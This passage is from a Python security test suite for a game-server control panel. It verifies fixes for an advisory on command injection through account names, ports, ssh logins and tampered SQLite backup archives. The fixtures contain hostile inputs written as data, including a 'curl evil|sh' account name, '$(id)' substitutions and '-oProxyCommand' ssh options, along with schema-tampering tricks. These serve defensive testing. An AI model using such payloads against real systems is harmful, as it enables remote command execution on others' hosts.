    ("files.lgsm_game_config", lambda u, s: _sm_files.lgsm_game_config(_GH_SRV, u, s),
     lambda r: bool(r.get("error")), True, "details"),
    ("files.lgsm_get_values", lambda u, s: _sm_files.lgsm_get_values(_GH_SRV, u, s, ["port"]),
     lambda r: r is None, True, "common.cfg"),
    ("files.lgsm_write_config", lambda u, s: _sm_files.lgsm_write_config(_GH_SRV, u, s, {"port": "1"}),
     _is_false_pair, True, "config-lgsm"),
    ("files.browse_dir", lambda u, s: _sm_files.browse_dir(_GH_SRV, u, "serverfiles"),
     lambda r: r is None, False, "find"),
    ("files.read_file", lambda u, s: _sm_files.read_file(_GH_SRV, u, "a.cfg"),
     lambda r: isinstance(r, tuple) and r[0] is None, False, "a.cfg"),
    ("files.stat_upload_targets", lambda u, s: _sm_files.stat_upload_targets(_GH_SRV, u, "", ["a.cfg"]),
     lambda r: r is None, False, "-maxdepth 1"),
    ("files.upload_file", lambda u, s: _sm_files.upload_file(_GH_SRV, u, "", "a.cfg", b"x", overwrite=True),
     _is_false_pair, False, "base64 -d"),
    ("files.delete_path", lambda u, s: _sm_files.delete_path(_GH_SRV, u, "a.cfg"),
     _is_false_pair, False, "rm"),
    ("files.stat_path", lambda u, s: _sm_files.stat_path(_GH_SRV, u, "a.cfg"),
     lambda r: r is None, False, "a.cfg"),
    ("files.stream_path (paramiko)", lambda u, s: list(_sm_files.stream_path(_GH_SRV, u, "a.cfg")),
     lambda r: r == [], False, "realpath"),
    ("routes._shared._looks_installed", lambda u, s: _gh_shared._looks_installed(_GH_APP, _GH_SRV, u, s),
     lambda r: r is None, True, "details"),
    # Registered and refused: it keeps the drain alive for the next tick, as a failed read always
    # has, and sends nothing.
    ("routes._shared._drain_action_output", lambda u, s: _gh_drain(u),
     lambda r: r is True, False, ".panel-update.log"),
]


def _gh_old_spelling(cmd):
    """What the builders spelled BY HAND before the helper, for the same account and body:
    f"sudo -u {user} bash -c {_quote(inner)}" or f"sudo -u {user} {_quote(arg)}…"."""
    argv = _gh_shlex.split(cmd)
    if argv[:2] != ["sudo", "-u"] or len(argv) < 4:
        return None
    if argv[3:5] == ["bash", "-c"] and len(argv) == 5:
        return "sudo -u %s bash -c %s" % (argv[2], _gh_shlex.quote(argv[4]))
    return "sudo -u %s %s" % (argv[2], " ".join(_gh_shlex.quote(a) for a in argv[3:]))


def _gh_command_texts(sent):
    """Every command TEXT that went out, whatever the transport."""
    out = []
    for rec in sent:
        if rec[0] in ("run", "exec"):
            out.append(rec[1])
        elif rec[0] == "popen":
            out.append(str(rec[1][-1]) if rec[1][0] == "ssh" else " ".join(map(str, rec[1])))
        elif rec[0] == "priv":
            out.append("%s %s" % (rec[1], " ".join(map(str, rec[2]))))
    return out


try:
    _sm_core.run_command = _gh_run
    _sm_core.run_privileged = _gh_privileged
    _sm_core._exec_local_argv = lambda argv, **k: (_gh_sent.append(("argv", list(argv))), ("", "", 0))[1]
    # _gamedig_host is left REAL: it asks the host for its address over the recorded transport,
    # so a gamedig reader that forgets to refuse early is seen sending that too.
    _sm_core.helper_present = lambda recheck=False: False
    _sm_core.get_connection = lambda s, **k: _GhClient()
    _sm_core._resolve_ts_host = lambda s: "ts-host"
    _sm_cron.subprocess.Popen = _GhPopen
    _sm_files.subprocess.Popen = _GhPopen
    _sm_game.time.sleep = lambda s: None

    for _gh_label, _gh_call, _gh_refused, _gh_takes_self, _gh_anchor in _GH_TABLE:
        _gh_bad_runs = []
        for _gh_name in _GH_BAD:
            # "" and None as the SCRIPT mean "the account's own name" to every caller that takes
            # one (`selfname or user`), so they are unsafe only as the account.
            for _gh_as_self in ((False, True) if _gh_takes_self and _gh_name else (False,)):
                _gh_u, _gh_s = ("gm2", _gh_name) if _gh_as_self else (_gh_name, "gmodserver")
                _gh_sent.clear()
                try:
                    _gh_r, _gh_exc = _gh_call(_gh_u, _gh_s), None
                except Exception as _e:        # a crash is not a refusal
                    _gh_r, _gh_exc = None, _e
                if _gh_exc is not None or _gh_sent or not _gh_refused(_gh_r):
                    _gh_bad_runs.append("%s=%r -> %s" % (
                        "selfname" if _gh_as_self else "user", _gh_name,
                        ("raised %r" % _gh_exc) if _gh_exc is not None else
                        ("SENT %r" % (_gh_command_texts(_gh_sent)[:1],)) if _gh_sent else
                        ("returned %r, which is not this function's refusal" % (_gh_r,))))
        check("GHSA-hh39 %s: every unsafe account%s name is refused, as a refusal, and nothing is sent"
              % (_gh_label, "/script" if _gh_takes_self else ""),
              not _gh_bad_runs, "; ".join(_gh_bad_runs[:4]))
        # ...and a plain name still sends its command, spelled exactly as the old builders did.
        _gh_sent.clear()
        try:
            _gh_r = _gh_call("gm2", "gmodserver")
            _gh_err = None
        except Exception as _e:
            _gh_err = _e
        _gh_texts = _gh_command_texts(_gh_sent)
        _gh_sudo = [t for t in _gh_texts if t.startswith("sudo -u ")]
        _gh_respelled = [t for t in _gh_sudo if _gh_old_spelling(t) != t]
        check("GHSA-hh39 %s: ...while a plain name still sends its command, byte for byte as before"
              % _gh_label,
              _gh_err is None and not _gh_respelled
              and all(t.startswith("sudo -u gm") for t in _gh_sudo)
              and (any(_gh_anchor in t for t in _gh_sudo) if _gh_anchor else bool(_gh_texts)),
              "raised=%r sent=%r respelled=%r" % (_gh_err, [t[:90] for t in _gh_texts][:4],
                                                  _gh_respelled[:1]))

    # ── the builders themselves ─────────────────────────────────────────────────────────────────
    _gh_raised = []
    for _gh_name in _GH_BAD:
        for _gh_kw in ({"user": _gh_name}, {"user": "gm2", "selfname": _gh_name}):
            if "selfname" in _gh_kw and not _gh_name:
                continue
            for _gh_builder, _gh_arg in ((_sm_core.game_user_cmd, "true"),
                                         (_sm_core.game_user_exec_cmd, ["true"])):
                try:
                    _gh_builder(_gh_kw["user"], _gh_arg, selfname=_gh_kw.get("selfname"))
                except _sm_core.UnsafeGameAccount:
                    continue
                except Exception as _e:
                    _gh_raised.append("%s %r raised %r" % (_gh_builder.__name__, _gh_kw, _e))
                    continue
                _gh_raised.append("%s %r BUILT a command" % (_gh_builder.__name__, _gh_kw))
    check("GHSA-hh39 builders: every unsafe account or script name raises UnsafeGameAccount",
          not _gh_raised, "; ".join(_gh_raised[:4]))
    check("GHSA-hh39 builders: UnsafeGameAccount is a ValueError, so an existing `except ValueError` "
          "already treats it as bad input", issubclass(_sm_core.UnsafeGameAccount, ValueError))
    check("GHSA-hh39 builders: a plain name gives exactly the old hand-built text",
          _sm_core.game_user_cmd("gm2", "cd /home/gm2 && ./gmodserver details")
          == "sudo -u gm2 bash -c 'cd /home/gm2 && ./gmodserver details'"
          and _sm_core.game_user_exec_cmd("gm2", ["rm", "-f", "--", "/home/gm2/lgsm/backup/a.tar.gz"])
          == "sudo -u gm2 rm -f -- /home/gm2/lgsm/backup/a.tar.gz",
          repr((_sm_core.game_user_cmd("gm2", "x y"), _sm_core.game_user_exec_cmd("gm2", ["a b"]))))
    _gh_argv_bad = []
    for _gh_name in _GH_BAD:
        try:
            _sm_cron._as_user_argv(_gh_name, "cat", "/x")
            _gh_argv_bad.append(repr(_gh_name))
        except _sm_core.UnsafeGameAccount:
            pass
    check("GHSA-hh39 cron._as_user_argv: an argv has no shell, but sudo still resolves the name — "
          "every unsafe one is refused", not _gh_argv_bad, ", ".join(_gh_argv_bad))
    check("GHSA-hh39 cron._as_user_argv: ...and a plain one is the same argv as before",
          _sm_cron._as_user_argv("gm2", "cat", "/x") == ["sudo", "-u", "gm2", "cat", "/x"])

    # ── review F3: a port that is not a number never reaches the hourly restart line ──────────
    # GameServer.port is INTEGER, but SQLite keeps TEXT in it for a row written that way, and
    # SQLAlchemy hands it back as a str. set_daily_restart interpolated it raw into a cron line
    # /bin/sh runs as the account — the one gamedig caller in the tree without int(port).
    _GH_TEXT_PORT = "27015; touch /tmp/ghsa-f3; true"
    _gh_rc_line = "10 * * * * " + _sm_core.daily_restart_check_cmd(
        "gm2", "gmodserver", _sm_core.GAMEDIG_TYPE["gmod"], "127.0.0.1", 27999) + "\n"
    _gh_saved_crontab = _GH_CRONTAB
    _GH_CRONTAB = _gh_rc_line               # a restart check the upgrade recognises and rewrites

    def _gh_f3(call):
        _gh_sent.clear()
        try:
            return call(), None, _gh_command_texts(_gh_sent)
        except Exception as _e:              # a crash is not a refusal
            return None, _e, _gh_command_texts(_gh_sent)
    try:
        _gh_r, _gh_e, _gh_t = _gh_f3(lambda: _sm_core.set_daily_restart(
            _GH_SRV, "gm2", "gmodserver", "gmod", _GH_TEXT_PORT))
        check("GHSA-hh39 F3 set_daily_restart: a port stored as text is refused, and nothing is sent",
              _gh_e is None and _gh_r == (False, "invalid port") and not _gh_t,
              "raised=%r returned=%r sent=%r" % (_gh_e, _gh_r, [t[:80] for t in _gh_t[:2]]))
        _gh_ok3 = []
        for _gh_p in (27015, "27015", 27015.0):     # the number, however SQLite handed it back
            _gh_r, _gh_e, _gh_t = _gh_f3(lambda: _sm_core.set_daily_restart(
                _GH_SRV, "gm2", "gmodserver", "gmod", _gh_p))
            _gh_ok3.append(_gh_e is None and _gh_r[0] is True
                           and any("127.0.0.1:27015 2>/dev/null" in t for t in _gh_t))
        check("GHSA-hh39 F3 set_daily_restart: ...while a numeric port still writes the line, as a number",
              all(_gh_ok3), repr(_gh_ok3))
        _gh_r, _gh_e, _gh_t = _gh_f3(lambda: _sm_cron.upgrade_managed_cron_tracking(
            _GH_SRV, "gm2", "gmodserver", "gmod", _GH_TEXT_PORT))
        check("GHSA-hh39 F3 upgrade_managed_cron_tracking (daily, unattended): a text port is refused "
              "before the crontab is even read", _gh_e is None and _gh_r is False and not _gh_t,
              "raised=%r returned=%r sent=%r" % (_gh_e, _gh_r, [t[:80] for t in _gh_t[:2]]))
        _gh_r, _gh_e, _gh_t = _gh_f3(lambda: _sm_cron.upgrade_managed_cron_tracking(
            _GH_SRV, "gm2", "gmodserver", "gmod", 27015))
        check("GHSA-hh39 F3 upgrade_managed_cron_tracking: ...while a numeric one heals the line to it",
              _gh_e is None and _gh_r is True and any("127.0.0.1:27015 2>/dev/null" in t for t in _gh_t),
              "raised=%r returned=%r sent=%r" % (_gh_e, _gh_r, [t[:80] for t in _gh_t[-2:]]))
        _gh_bad3 = []
        for _gh_p in (_GH_TEXT_PORT, "0x10", 27015.5, True, [27015]):
            try:
                _gh_line = _sm_core.daily_restart_check_cmd("gm2", "gmodserver", "garrysmod", "1.2.3.4", _gh_p)
                _gh_bad3.append("%r built %r" % (_gh_p, _gh_line[-60:]))
            except ValueError:
                pass
        check("GHSA-hh39 F3 daily_restart_check_cmd: the line's own builder refuses what int() refuses "
              "(and a fractional or boolean port int() would quietly change)", not _gh_bad3,
              "; ".join(_gh_bad3))
        check("GHSA-hh39 F3 daily_restart_check_cmd: ...and writes the number it was given",
              "1.2.3.4:27015 2>" in _sm_core.daily_restart_check_cmd(
                  "gm2", "gmodserver", "garrysmod", "1.2.3.4", " 27015"))
    finally:
        _GH_CRONTAB = _gh_saved_crontab

    # ── review F4: a stored SSH login or host never becomes an ssh OPTION ─────────────────────
    # Four argvs hand `<username>@<host>` to the system ssh client, and ssh reads an argument that
    # begins with `-` as an option: username "-oProxyCommand=<cmd>" ran <cmd> on the panel's host.
    # Each is driven with a hostile login and a hostile host, through the recorded Popen, and must
    # refuse without spawning anything; a plain one must still spawn ssh with the destination
    # after `--`.
    from panel.ops import terminal_session as _gh_term     # noqa: E402

    def _gh_ts(**kw):
        d = dict(id=9105, is_local=False, auth_method="tailscale", host="box.ts.net", port=22,
                 username="admin", sudo_enabled=False, name="h", linuxgsm_user="")
        d.update(kw)
        return NS(**d)

    _GH_SSH_BAD = [("username", "-oProxyCommand=touch /tmp/ghsa-f4"), ("username", "-l"),
                   ("username", "root@evil"), ("username", "a b"), ("username", "admin\n"),
                   ("host", "-oProxyCommand=touch /tmp/ghsa-f4"), ("host", "--"), ("host", "h;id"),
                   ("host", "a b"), ("host", ""), ("port", "22 -oProxyCommand=x")]
    _GH_SSH_SITES = [
        ("_core._run_via_ssh_cli (the Tailscale transport)",
         lambda srv: _sm_core._run_via_ssh_cli(srv, "echo hi", timeout=5, sudo=False),
         lambda r: r == ("", "invalid ssh login or host", -1)),
        ("cron.stream_game_backup (Tailscale)",
         lambda srv: list(_sm_cron.stream_game_backup(srv, "gm2", "gmodserver-2026.tar.gz")),
         lambda r: r == []),
        ("files.stream_path (Tailscale)",
         lambda srv: list(_sm_files.stream_path(srv, "gm2", "a.cfg")),
         lambda r: r == []),
        # Raises: terminal open() turns it into "Could not start a shell on …".
        ("terminal_session._open_tailscale (the web terminal)",
         lambda srv: _gh_term._open_tailscale(NS(), srv, 80, 24), None),
    ]
    _gh_saved_ts = _sm_core._resolve_ts_host
    _sm_core._resolve_ts_host = lambda srv: srv.host    # the stored host, unresolved
    try:
        for _gh_label, _gh_call, _gh_refused in _GH_SSH_SITES:
            _gh_bad4 = []
            for _gh_field, _gh_val in _GH_SSH_BAD:
                _gh_sent.clear()
                try:
                    _gh_r, _gh_e = _gh_call(_gh_ts(**{_gh_field: _gh_val})), None
                except Exception as _e:
                    _gh_r, _gh_e = None, _e
                _gh_popen = [rec for rec in _gh_sent if rec[0] == "popen"]
                if _gh_refused is None:
                    _gh_fine = isinstance(_gh_e, ValueError)    # UnsafeSshDestination is one
                else:
                    _gh_fine = _gh_e is None and _gh_refused(_gh_r)
                if _gh_popen or not _gh_fine:
                    _gh_bad4.append("%s=%r -> %s" % (
                        _gh_field, _gh_val, ("SPAWNED %r" % (_gh_popen[0][1],)) if _gh_popen else
                        ("raised %r" % (_gh_e,)) if _gh_e else ("returned %r" % (_gh_r,))))
            check("GHSA-hh39 F4 %s: a hostile stored login, host or port is refused and nothing is "
                  "spawned" % _gh_label, not _gh_bad4, "; ".join(_gh_bad4[:4]))
            if _gh_refused is None:
                continue        # the terminal's plain case is part06's (it would open a real pty)
            _gh_sent.clear()
            try:
                _gh_call(_gh_ts())
            except Exception:
                pass
            _gh_popen = [rec[1] for rec in _gh_sent if rec[0] == "popen"]
            _gh_argv = _gh_popen[0] if _gh_popen else []
            _gh_i = _gh_argv.index("--") if "--" in _gh_argv else -1
            check("GHSA-hh39 F4 %s: ...while a plain one still spawns ssh, the destination after `--`"
                  % _gh_label, _gh_argv[:1] == ["ssh"] and _gh_i > 0
                  and _gh_argv[_gh_i + 1:_gh_i + 2] == ["admin@box.ts.net"]
                  and not any(a.startswith("-") for a in _gh_argv[_gh_i + 1:]),
                  "argv=%r" % (_gh_argv,))
        check("GHSA-hh39 F4 terminal_session._ssh_argv: a plain login gets its argv, the destination "
              "after `--`", _gh_term._ssh_argv(_gh_ts())[-2:] == ["--", "admin@box.ts.net"],
              repr(_gh_term._ssh_argv(_gh_ts())))
        # The terminal opened its pty BEFORE building the argv, so a refused argv would have leaked
        # both descriptors of the pair on every attempt. Counted, not assumed.
        _gh_fds = lambda: len(os.listdir("/proc/self/fd"))     # noqa: E731
        _gh_fd0 = _gh_fds()
        for _ in range(5):
            try:
                _gh_term._open_tailscale(NS(), _gh_ts(username="-oProxyCommand=x"), 80, 24)
            except Exception:       # refused (ValueError) — or, if it was not, whatever came next
                pass
        check("GHSA-hh39 F4 terminal_session._open_tailscale: a refused login leaks no descriptor",
              _gh_fds() == _gh_fd0, "%d open before, %d after five refusals" % (_gh_fd0, _gh_fds()))
    finally:
        _sm_core._resolve_ts_host = _gh_saved_ts
finally:
    for _gh_mod, _gh_attr, _gh_val in _GH_SAVED:
        setattr(_gh_mod, _gh_attr, _gh_val)
    _gh_ps._action_output.pop(9104, None)

# ═══════════════════════════════════════════════════════════════════════════════════════════════
# 3. DATA LAYER
# ═══════════════════════════════════════════════════════════════════════════════════════════════
from cryptography.fernet import Fernet as _GhFernet  # noqa: E402
from sqlalchemy import create_engine as _gh_engine  # noqa: E402
from sqlalchemy.orm import Session as _GhSession  # noqa: E402

from panel.db import models as _gh_models  # noqa: E402
from panel.ops import backup as _gh_bk  # noqa: E402

_gh_dir = _gh_tmp.mkdtemp(prefix="lgsm-ghsa-")


def _gh_make_db(path, game_rows=(), remote_rows=()):
    """A real panel.db — the models' own schema — with rows written RAW, the way a hand edit or a
    tampered archive would put them there: @validates never sees them."""
    eng = _gh_engine("sqlite:///" + path)
    _gh_models.db.metadata.create_all(eng)
    eng.dispose()
    con = _gh_sqlite.connect(path)
    for rid, username in remote_rows:
        con.execute("INSERT INTO remote_server (id, name, host, port, username, linuxgsm_user) "
                    "VALUES (?, 'h', 'h', 22, ?, '')", (rid, username))
    for gid, short_name, game_type, port in game_rows:
        con.execute("INSERT INTO game_server (id, remote_id, name, short_name, game_type, port) "
                    "VALUES (?, 1, 'g', ?, ?, ?)", (gid, short_name, game_type, port))
    con.commit()
    con.close()


# ── restore: the archive's rows are checked before anything is touched ──────────────────────────
_GH_BK_ATTRS = ("BACKUP_DIR", "DATA_DIR", "DB_PATH", "CONFIG_FILE", "SECRET_FILE", "CRED_KEY_FILE",
                "_helper_present", "_run_verb", "create_backup", "get_passphrase")
_gh_bk_saved = {a: getattr(_gh_bk, a) for a in _GH_BK_ATTRS}
_gh_archive_key = _GhFernet.generate_key()
_gh_live_key = _GhFernet.generate_key()          # a DIFFERENT key: the archive's own must be used
_gh_seq = [0]


def _gh_enc(value, key=_gh_archive_key):
    return "enc:v1:" + _GhFernet(key).encrypt(value.encode()).decode()


def _gh_archive(db_bytes_or_rows, cred_key=_gh_archive_key):
    """Write a backup archive into the redirected BACKUP_DIR; returns its name."""
    _gh_seq[0] += 1
    name = "panel-backup-20260926-1200%02d-manual.tar.gz" % _gh_seq[0]
    work = _gh_tmp.mkdtemp(dir=_gh_dir)
    dbp = os.path.join(work, "panel.db")
    if isinstance(db_bytes_or_rows, bytes):
        with open(dbp, "wb") as f:
            f.write(db_bytes_or_rows)
    else:
        _gh_make_db(dbp, **db_bytes_or_rows)
    members = {"panel.db": open(dbp, "rb").read(), "config.json": b"{}", "secret_key": b"s"}
    if cred_key is not None:
        members["cred_key"] = cred_key
    with _gh_tar.open(os.path.join(str(_gh_bk.BACKUP_DIR), name), "w:gz") as tar:
        for mname, data in members.items():
            ti = _gh_tar.TarInfo(mname)
            ti.size = len(data)
            tar.addfile(ti, _gh_io.BytesIO(data))
    return name


_gh_calls = []
try:
    _gh_data = os.path.join(_gh_dir, "data")
    os.makedirs(os.path.join(_gh_data, "backups"), mode=0o700)
    _gh_bk.DATA_DIR = type(_gh_bk.DATA_DIR)(_gh_data)
    _gh_bk.BACKUP_DIR = _gh_bk.DATA_DIR / "backups"
    _gh_bk.DB_PATH = _gh_bk.DATA_DIR / "panel.db"
    _gh_bk.CONFIG_FILE = _gh_bk.DATA_DIR / "config.json"
    _gh_bk.SECRET_FILE = _gh_bk.DATA_DIR / "secret_key"
    _gh_bk.CRED_KEY_FILE = _gh_bk.DATA_DIR / "cred_key"
    _gh_bk.CRED_KEY_FILE.write_bytes(_gh_live_key)
    _gh_make_db(str(_gh_bk.DB_PATH), game_rows=[(1, "livesrv", "csgo", 27015)])
    _gh_live_bytes = _gh_bk.DB_PATH.read_bytes()
    _gh_bk._helper_present = lambda: True
    _gh_bk._run_verb = lambda verb, args, **k: (_gh_calls.append(("verb", verb)), ("", "", 0))[1]
    _gh_bk.create_backup = lambda kind="manual", encrypt=True, passphrase=None: (
        _gh_calls.append(("safety", kind)), (True, "panel-backup-20260926-000000-prerestore.tar.gz"))[1]
    _gh_bk.get_passphrase = lambda: ""
    _gh_stage = os.path.join(_gh_data, ".restore-stage")
    _GH_OK_REMOTE = [(1, _gh_enc("admin"))]

    def _gh_restore(rows_or_bytes, **kw):
        _gh_calls.clear()
        _gh_shutil.rmtree(_gh_stage, ignore_errors=True)
        return _gh_bk.restore_backup(_gh_archive(rows_or_bytes, **kw))

    _gh_cases = [
        ("an injected game server account", {"game_rows": [(7, "x; curl evil|sh; #", "csgo", 27015)],
                                             "remote_rows": _GH_OK_REMOTE}, "game server #7 (short_name)"),
        ("an injected LinuxGSM script name", {"game_rows": [(8, "gmodserver", "gmod$(id)", 27015)],
                                              "remote_rows": _GH_OK_REMOTE}, "game server #8 (game_type)"),
        ("an SSH login that is an ssh OPTION, encrypted with the ARCHIVE's key",
         {"game_rows": [], "remote_rows": [(3, _gh_enc("-oProxyCommand=sh"))]}, "host #3 (username)"),
        ("a port stored as text", {"game_rows": [(9, "gmodserver", "gmod", "27015; id")],
                                   "remote_rows": _GH_OK_REMOTE}, "game server #9 (port)"),
    ]
    for _gh_what, _gh_rows, _gh_named in _gh_cases:
        _gh_ok, _gh_msg = _gh_restore(_gh_rows)
        check("GHSA-hh39 restore: a backup carrying %s is refused, naming the row" % _gh_what,
              _gh_ok is False and _gh_named in _gh_msg and "Nothing on this panel was changed" in _gh_msg,
              "%r %r" % (_gh_ok, _gh_msg))
        check("GHSA-hh39 restore: ...before the safety copy, the staging or the swap (%s)" % _gh_what,
              _gh_calls == [] and not os.path.exists(_gh_stage)
              and _gh_bk.DB_PATH.read_bytes() == _gh_live_bytes,
              "calls=%r staged=%r" % (_gh_calls, os.path.exists(_gh_stage)))
    _gh_ok, _gh_msg = _gh_restore(b"this is not a sqlite database at all" * 40)
    check("GHSA-hh39 restore: a database SQLite cannot read is refused (it cannot be checked)",
          _gh_ok is False and "could not be read" in _gh_msg and _gh_calls == [], "%r %r" % (_gh_ok, _gh_msg))
    # The controls: the check is not a blanket refusal.
    _gh_ok, _gh_msg = _gh_restore({"game_rows": [(1, "gmodserver", "gmod", 27015), (2, "cs2srv", "cs2", 27016)],
                                   "remote_rows": [(1, _gh_enc("admin")), (2, "legacyplain")]})
    check("GHSA-hh39 restore: a clean backup still restores — safety copy, staging and the verb run",
          _gh_ok is True and _gh_calls == [("safety", "prerestore"), ("verb", "panel-restore")]
          and os.path.exists(os.path.join(_gh_stage, "panel.db")), "%r %r %r" % (_gh_ok, _gh_msg, _gh_calls))
    _gh_ok, _gh_msg = _gh_restore({"game_rows": [(1, "gmodserver", "gmod", 27015)],
                                   "remote_rows": [(1, _gh_enc("-oProxyCommand=sh", _gh_live_key))]})
    check("GHSA-hh39 restore: a value the restored key cannot decrypt is unreadable after the restore "
          "too, and does not block it", _gh_ok is True, "%r %r" % (_gh_ok, _gh_msg))
    _gh_ok, _gh_msg = _gh_restore({"game_rows": [(1, "gmodserver", "gmod", 27015)],
                                   "remote_rows": [(1, _gh_enc("-oProxyCommand=sh", _gh_live_key))]},
                                  cred_key=None)
    check("GHSA-hh39 restore: an archive with no cred_key is checked with the key the panel keeps",
          _gh_ok is False and "host #1 (username)" in _gh_msg, "%r %r" % (_gh_ok, _gh_msg))
    _gh_calls.clear()
    _gh_shutil.rmtree(_gh_stage, ignore_errors=True)
    _gh_con = _gh_sqlite.connect(os.path.join(_gh_dir, "old.db"))
    _gh_con.execute("create table t(x)")
    _gh_con.commit()
    _gh_con.close()
    _gh_ok, _gh_msg = _gh_restore(open(os.path.join(_gh_dir, "old.db"), "rb").read())
    check("GHSA-hh39 restore: a database from before these tables existed is not refused for it",
          _gh_ok is True, "%r %r" % (_gh_ok, _gh_msg))

    # ── review F2: the check must read the database the way SQLite will serve it ────────────────
    # SQLite resolves table and column names case-INSENSITIVELY and sqlite_master keeps whatever
    # spelling a table was created with. The first version looked 'game_server' / 'short_name' up
    # by exact name, so an archive spelling them "GAME_SERVER" / "SHORT_NAME" skipped the check
    # entirely — and the ORM's `FROM game_server` read that table anyway. Every other way a
    # value the panel later reads could differ from the one checked is refused as well.
    def _gh_db(game_rows=(), remote_rows=_GH_OK_REMOTE, sql=(), writable=()):
        path = os.path.join(_gh_tmp.mkdtemp(dir=_gh_dir), "panel.db")
        _gh_make_db(path, game_rows=game_rows, remote_rows=remote_rows)
        con = _gh_sqlite.connect(path)
        for stmt in sql:
            con.execute(stmt)
        con.commit()
        if writable:
            con.execute("PRAGMA writable_schema=ON")
            for stmt in writable:
                con.execute(stmt)
            con.commit()
        con.close()
        with open(path, "rb") as f:
            return f.read()

    # SQLite refuses to rename a table or column to another case of its own name (to SQLite that
    # IS its own name), so the fixtures go through a temporary one.
    def _gh_retable(old, new):
        return ['ALTER TABLE "%s" RENAME TO ghsa_tmp' % old, 'ALTER TABLE ghsa_tmp RENAME TO "%s"' % new]

    def _gh_recol(table, old, new):
        return ['ALTER TABLE "%s" RENAME COLUMN "%s" TO ghsa_tmp' % (table, old),
                'ALTER TABLE "%s" RENAME COLUMN ghsa_tmp TO "%s"' % (table, new)]

    _GH_PAYLOAD = "x; touch /tmp/ghsa-f2; #"
    _gh_f2 = [
        ("an UPPER-CASE table", "game server #11 (short_name)",
         _gh_db([(11, _GH_PAYLOAD, "csgo", 27015)], sql=_gh_retable("game_server", "GAME_SERVER"))),
        ("an UPPER-CASE column", "game server #12 (short_name)",
         _gh_db([(12, _GH_PAYLOAD, "csgo", 27015)],
                sql=_gh_recol("game_server", "short_name", "SHORT_NAME"))),
        ("a Mixed-Case table AND column", "game server #13 (game_type)",
         _gh_db([(13, "gmodserver", "gmod$(id)", 27015)],
                sql=_gh_retable("game_server", "Game_Server")
                + _gh_recol("Game_Server", "game_type", "Game_Type"))),
        ("an upper-case HOST table, its login encrypted with the archive's key", "host #3 (username)",
         _gh_db([], remote_rows=[(3, _gh_enc("-oProxyCommand=sh"))],
                sql=_gh_retable("remote_server", "REMOTE_SERVER")
                + _gh_recol("REMOTE_SERVER", "username", "UserName"))),
        ("an upper-case PORT column holding text", "game server #14 (port)",
         _gh_db([(14, "gmodserver", "gmod", "27015; id")],
                sql=_gh_recol("game_server", "port", "PORT"))),
    ]
    for _gh_what, _gh_named, _gh_bytes in _gh_f2:
        _gh_ok, _gh_msg = _gh_restore(_gh_bytes)
        check("GHSA-hh39 restore F2: %s is resolved as SQLite resolves it, and its bad row refused"
              % _gh_what, _gh_ok is False and _gh_named in _gh_msg and _gh_calls == [],
              "%r %r calls=%r" % (_gh_ok, _gh_msg, _gh_calls))
    # Shapes that let a value CHANGE after the check read it, or hide one from it. Every row in
    # these archives is clean: what is refused is the shape.
    _GH_CLEAN = [(15, "gmodserver", "gmod", 27015)]
    _gh_f2_shape = [
        ("a trigger that rewrites a game server's account after the panel inserts one", "trigger",
         _gh_db(_GH_CLEAN, sql=["CREATE TRIGGER ghsa_t AFTER INSERT ON game_server BEGIN "
                                "UPDATE game_server SET short_name = '%s' WHERE id = NEW.id; END"
                                % _GH_PAYLOAD])),
        ("a trigger on ANOTHER table that rewrites one when the panel logs anything", "trigger",
         _gh_db(_GH_CLEAN, sql=["CREATE TRIGGER ghsa_t2 AFTER INSERT ON audit_log BEGIN "
                                "UPDATE game_server SET game_type = 'gmod$(id)'; END"])),
        ("a VIEW standing in for the game_server table", "view",
         _gh_db(_GH_CLEAN, sql=["ALTER TABLE game_server RENAME TO gs_real",
                                "CREATE VIEW game_server AS SELECT * FROM gs_real"])),
        ("an account COMPUTED from a column the panel updates on every poll", "computes",
         _gh_db([], sql=["DROP TABLE game_server",
                         "CREATE TABLE game_server (id INTEGER PRIMARY KEY, remote_id INTEGER, "
                         "status VARCHAR(32), game_type VARCHAR(64), port INTEGER, query_port INTEGER, "
                         "short_name TEXT GENERATED ALWAYS AS (CASE status WHEN 'online' THEN '%s' "
                         "ELSE 'gmodserver' END) VIRTUAL)" % _GH_PAYLOAD,
                         "INSERT INTO game_server (id, remote_id, status, game_type, port) "
                         "VALUES (15, 1, 'offline', 'gmod', 27015)"])),
        ("a game_server table with no game_type column", "no game_type column",
         _gh_db(_GH_CLEAN, sql=["ALTER TABLE game_server DROP COLUMN game_type"])),
        # An index whose entries disagree with its table: the TABLE holds a clean account and the
        # index the payload, so a covering read (`SELECT short_name … WHERE remote_id = ?`) gets
        # the payload while a check reading the table sees 'gmodserver'. Only SQLite's own
        # integrity check notices.
        ("an index whose entries disagree with its table", "integrity check",
         _gh_db(_GH_CLEAN, sql=["UPDATE game_server SET name = '%s'" % _GH_PAYLOAD,
                                "CREATE INDEX ix_ghsa ON game_server (remote_id, name)"],
                writable=["UPDATE sqlite_master SET sql = 'CREATE INDEX ix_ghsa ON game_server "
                          "(remote_id, short_name)' WHERE name = 'ix_ghsa'"])),
        # ...and the other way round, the shape that beat a check reading through the index: the
        # table holds the payload and the index a clean name.
        ("an index hiding the table's payload from a covering read", "integrity check",
         _gh_db([(15, _GH_PAYLOAD, "gmod", 27015)],
                sql=["UPDATE game_server SET name = 'gmodserver'",
                     "CREATE INDEX ix_ghsa ON game_server (remote_id, name)"],
                writable=["UPDATE sqlite_master SET sql = 'CREATE INDEX ix_ghsa ON game_server "
                          "(remote_id, short_name)' WHERE name = 'ix_ghsa'"])),
    ]
    for _gh_what, _gh_says, _gh_bytes in _gh_f2_shape:
        _gh_ok, _gh_msg = _gh_restore(_gh_bytes)
        check("GHSA-hh39 restore F2: %s is refused, and says why" % _gh_what,
              _gh_ok is False and _gh_says in _gh_msg and "Nothing on this panel was changed" in _gh_msg
              and _gh_calls == [] and _gh_bk.DB_PATH.read_bytes() == _gh_live_bytes,
              "%r %r calls=%r" % (_gh_ok, _gh_msg, _gh_calls))
    # The fixture proves what the integrity check is for: through the panel's own SQLite, the
    # covering read and the table disagree about the account.
    _gh_probe = os.path.join(_gh_tmp.mkdtemp(dir=_gh_dir), "probe.db")
    with open(_gh_probe, "wb") as _gh_pf:
        _gh_pf.write(_gh_f2_shape[5][2])
    _gh_pc = _gh_sqlite.connect(_gh_probe)
    try:
        _gh_cover = _gh_pc.execute("SELECT short_name FROM game_server WHERE remote_id = 1").fetchall()
        _gh_table = _gh_pc.execute("SELECT short_name FROM game_server NOT INDEXED").fetchall()
    finally:
        _gh_pc.close()
    check("GHSA-hh39 restore F2: (fixture) that index really does answer with a different account",
